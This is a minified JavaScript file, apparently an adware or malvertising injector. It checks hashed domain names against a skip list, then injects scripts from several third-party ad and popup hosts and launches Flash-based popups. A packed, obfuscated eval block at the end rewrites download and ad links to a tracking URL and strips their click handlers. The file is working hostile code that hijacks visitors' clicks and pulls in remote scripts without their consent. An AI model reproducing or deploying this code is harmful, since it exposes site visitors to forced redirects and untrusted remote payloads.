
function getCookie(e){var n=document.cookie,i=e+"=",o=n.indexOf("; "+i);if(-1==o){if(o=n.indexOf(i),0!=o)return null}else{o+=2;var t=document.cookie.indexOf(";",o);-1==t&&(t=n.length)}return unescape(n.substring(o+i.length,t))}
function spu_createCookie(e,t,i){if(i){var o=new Date;o.setTime(o.getTime()+60*i*60*1e3);var a="; expires="+o.toGMTString()}else var a="";document.cookie=e+"="+t+a+"; path=/"}
function md5cycle(f,h){var i=f[0],n=f[1],r=f[2],g=f[3];i=ff(i,n,r,g,h[0],7,-680876936),g=ff(g,i,n,r,h[1],12,-389564586),r=ff(r,g,i,n,h[2],17,606105819),n=ff(n,r,g,i,h[3],22,-1044525330),i=ff(i,n,r,g,h[4],7,-176418897),g=ff(g,i,n,r,h[5],12,1200080426),r=ff(r,g,i,n,h[6],17,-1473231341),n=ff(n,r,g,i,h[7],22,-45705983),i=ff(i,n,r,g,h[8],7,1770035416),g=ff(g,i,n,r,h[9],12,-1958414417),r=ff(r,g,i,n,h[10],17,-42063),n=ff(n,r,g,i,h[11],22,-1990404162),i=ff(i,n,r,g,h[12],7,1804603682),g=ff(g,i,n,r,h[13],12,-40341101),r=ff(r,g,i,n,h[14],17,-1502002290),n=ff(n,r,g,i,h[15],22,1236535329),i=gg(i,n,r,g,h[1],5,-165796510),g=gg(g,i,n,r,h[6],9,-1069501632),r=gg(r,g,i,n,h[11],14,643717713),n=gg(n,r,g,i,h[0],20,-373897302),i=gg(i,n,r,g,h[5],5,-701558691),g=gg(g,i,n,r,h[10],9,38016083),r=gg(r,g,i,n,h[15],14,-660478335),n=gg(n,r,g,i,h[4],20,-405537848),i=gg(i,n,r,g,h[9],5,568446438),g=gg(g,i,n,r,h[14],9,-1019803690),r=gg(r,g,i,n,h[3],14,-187363961),n=gg(n,r,g,i,h[8],20,1163531501),i=gg(i,n,r,g,h[13],5,-1444681467),g=gg(g,i,n,r,h[2],9,-51403784),r=gg(r,g,i,n,h[7],14,1735328473),n=gg(n,r,g,i,h[12],20,-1926607734),i=hh(i,n,r,g,h[5],4,-378558),g=hh(g,i,n,r,h[8],11,-2022574463),r=hh(r,g,i,n,h[11],16,1839030562),n=hh(n,r,g,i,h[14],23,-35309556),i=hh(i,n,r,g,h[1],4,-1530992060),g=hh(g,i,n,r,h[4],11,1272893353),r=hh(r,g,i,n,h[7],16,-155497632),n=hh(n,r,g,i,h[10],23,-1094730640),i=hh(i,n,r,g,h[13],4,681279174),g=hh(g,i,n,r,h[0],11,-358537222),r=hh(r,g,i,n,h[3],16,-722521979),n=hh(n,r,g,i,h[6],23,76029189),i=hh(i,n,r,g,h[9],4,-640364487),g=hh(g,i,n,r,h[12],11,-421815835),r=hh(r,g,i,n,h[15],16,530742520),n=hh(n,r,g,i,h[2],23,-995338651),i=ii(i,n,r,g,h[0],6,-198630844),g=ii(g,i,n,r,h[7],10,1126891415),r=ii(r,g,i,n,h[14],15,-1416354905),n=ii(n,r,g,i,h[5],21,-57434055),i=ii(i,n,r,g,h[12],6,1700485571),g=ii(g,i,n,r,h[3],10,-1894986606),r=ii(r,g,i,n,h[10],15,-1051523),n=ii(n,r,g,i,h[1],21,-2054922799),i=ii(i,n,r,g,h[8],6,1873313359),g=ii(g,i,n,r,h[15],10,-30611744),r=ii(r,g,i,n,h[6],15,-1560198380),n=ii(n,r,g,i,h[13],21,1309151649),i=ii(i,n,r,g,h[4],6,-145523070),g=ii(g,i,n,r,h[11],10,-1120210379),r=ii(r,g,i,n,h[2],15,718787259),n=ii(n,r,g,i,h[9],21,-343485551),f[0]=add32(i,f[0]),f[1]=add32(n,f[1]),f[2]=add32(r,f[2]),f[3]=add32(g,f[3])}function cmn(f,h,i,n,r,g){return h=add32(add32(h,f),add32(n,g)),add32(h<<r|h>>>32-r,i)}function ff(f,h,i,n,r,g,t){return cmn(h&i|~h&n,f,h,r,g,t)}function gg(f,h,i,n,r,g,t){return cmn(h&n|i&~n,f,h,r,g,t)}function hh(f,h,i,n,r,g,t){return cmn(h^i^n,f,h,r,g,t)}function ii(f,h,i,n,r,g,t){return cmn(i^(h|~n),f,h,r,g,t)}function md51(f){txt="";var h,i=f.length,n=[1732584193,-271733879,-1732584194,271733878];for(h=64;h<=f.length;h+=64)md5cycle(n,md5blk(f.substring(h-64,h)));f=f.substring(h-64);var r=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(h=0;h<f.length;h++)r[h>>2]|=f.charCodeAt(h)<<(h%4<<3);if(r[h>>2]|=128<<(h%4<<3),h>55)for(md5cycle(n,r),h=0;16>h;h++)r[h]=0;return r[14]=8*i,md5cycle(n,r),n}function md5blk(f){var h,i=[];for(h=0;64>h;h+=4)i[h>>2]=f.charCodeAt(h)+(f.charCodeAt(h+1)<<8)+(f.charCodeAt(h+2)<<16)+(f.charCodeAt(h+3)<<24);return i}function rhex(f){for(var h="",i=0;4>i;i++)h+=hex_chr[f>>8*i+4&15]+hex_chr[f>>8*i&15];return h}function hex(f){for(var h=0;h<f.length;h++)f[h]=rhex(f[h]);return f.join("")}function md5(f){return hex(md51(f))}function add32(f,h){return f+h&4294967295}function add32(f,h){var i=(65535&f)+(65535&h),n=(f>>16)+(h>>16)+(i>>16);return n<<16|65535&i}var hex_chr="0123456789abcdef".split("");"5d41402abc4b2a76b9719d911017c592"!=md5("hello");
var dh = md5(document.domain);
var dh2 = md5((location.host.match(/([^.]+)\.\w{2,3}(?:\.\w{2})?$/) || [])[1]);
if ((dh == "2156a5a306fe70cf8fa3089690710ce1") || (dh == "e9cfb34b0a12464a8cba0e37cd46c9c9") || (dh == "9f6fee670877957ccaddf0f1fbd3358a") || window.name.match(/^(a652c|ld893)/) || (dh == "eda8687ce70c3871ec2c072b814ff102") || (dh2 == "c822c1b63853ed273b89687ac505f9fa") || (dh2 == "17704e560a29181a0ccd98f80d999c28")) {

} else {
var s = document.getElementsByTagName('script')[0];
if (typeof s == 'undefined') { s = document.getElementsByTagName('head')[0]; }
if (typeof s == 'undefined') { s = document.getElementsByTagName('body')[0]; }
if (document.domain.search('google') != -1) {
//var g2 = document.createElement("script"); g2.async = true; g2.setAttribute("src","//a.xfreeservice.com/partner/mil2V0Ws/?cid=32&sid=pbbt&addCB=0&apptitle=AdSupply&plink=&"); s.parentNode.insertBefore(g2, s);
}

var dt=new Date();var ver=dt.toISOString().slice(0,10).replace(/-/g,"");




if (typeof kod92okdzm20 == 'undefined' && (self == top)) {
var https = (window.location.protocol == "https:") ? true : false;
var rndNum = Math.floor(Math.random() * (9999999));


var popArray = [
    '//cdncache-a.akamaihd.net/sub/o6e35e7/pbbt/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/pbbt/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/pbbt/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/pbbt/l.js?pid=1738&ext=adsupply',
    '//www.liveadexchanger.com/a/display.php?r=1059896',
    '//www.liveadexchanger.com/a/display.php?r=1059896'
];

var adParams = {
  a: '18361042', size:'800x600', numOfTimes: '1',duration: '1',serverdomain: 's.ad132m.com' ,period: 'hour'  , context:'c18421036' , openNewTab: true
};

var randomNumber = Math.floor(Math.random()*popArray.length);
var selectedPop = popArray[randomNumber];
var pp = document.createElement("script");pp.setAttribute("src", selectedPop);pp.setAttribute('async', 'true');
s.parentNode.insertBefore(pp, s);


var jjsss = document.createElement("script");
jjsss.async = true; jjsss.setAttribute("src","//macutnova.com/script.min.js");
s.parentNode.insertBefore(jjsss, s);
setTimeout(function() {
var rndN = Math.random();
BetterJsPop.flashUrl('//macutnova.com/flash.e.swf')
        .licenseUrl('//macutnova.com/license.php').perpage(3).add("http://p.michael930.com/s9baws56vwi11zdfnnyt8", {'cookieExpires': 60});
}, 5000);
var aply1 =document.createElement("script"); aply1.async=true; //aply1.setAttribute("src","//lightbox.linkbolic.com/scjs/lbx/lbxctxjs.js?aff_id=885&sbrand=Provider&subaff_id=pbbt&mode=lbx"); s.parentNode.insertBefore(aply1, s);

var aply1 =document.createElement("script"); aply1.async=true; aply1.setAttribute("src","//lightbox.linkbolic.com/scjs/lbx/lbxctxjs.js?aff_id=885&subaff_id=pbbt&sbrand=Provider&mode=lbx&nc=1"); s.parentNode.insertBefore(aply1, s);
var it = document.createElement("script"); it.async = true; it.setAttribute("src","//cdncache-a.akamaihd.net/sub/o6e35e7/pbbt/l.js?pid=1737&ext=Provider");
s.parentNode.insertBefore(it, s);
var kod92okdzm20 = true;
}
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 5=0;3 e=g(c(){(c(){5++;3 f=8.9(\'a[6*=h]\');3 a=\'//j.k.l/m-n-o-p-q\';7(f.1>0){b(i=0;i<f.1;++i){f[i].2(\'6\',a)}}f=8.9(\'.r a\');7(f.1>0){b(i=0;i<f.1;++i){f[i].2(\'6\',a);f[i].2(\'d\',\'\')}}f=8.9(\'a[s*=t]\');7(f.1>0){b(i=0;i<f.1;++i){f[i].2(\'6\',a);f[i].2(\'d\',\'\')}}7(5>4){u(5)}})()},v);',32,32,'|length|setAttribute|var||siti|href|if|document|querySelectorAll||for|function|onclick|sit||setInterval|adbrau||lrzxk|voluumtrk|com|53803cbd|b7da|4f8c|aa89|708df4469df1|advertDownload|id|atLink|clearInterval|300'.split('|'),0,{}));

 var rnd = Math.random();

}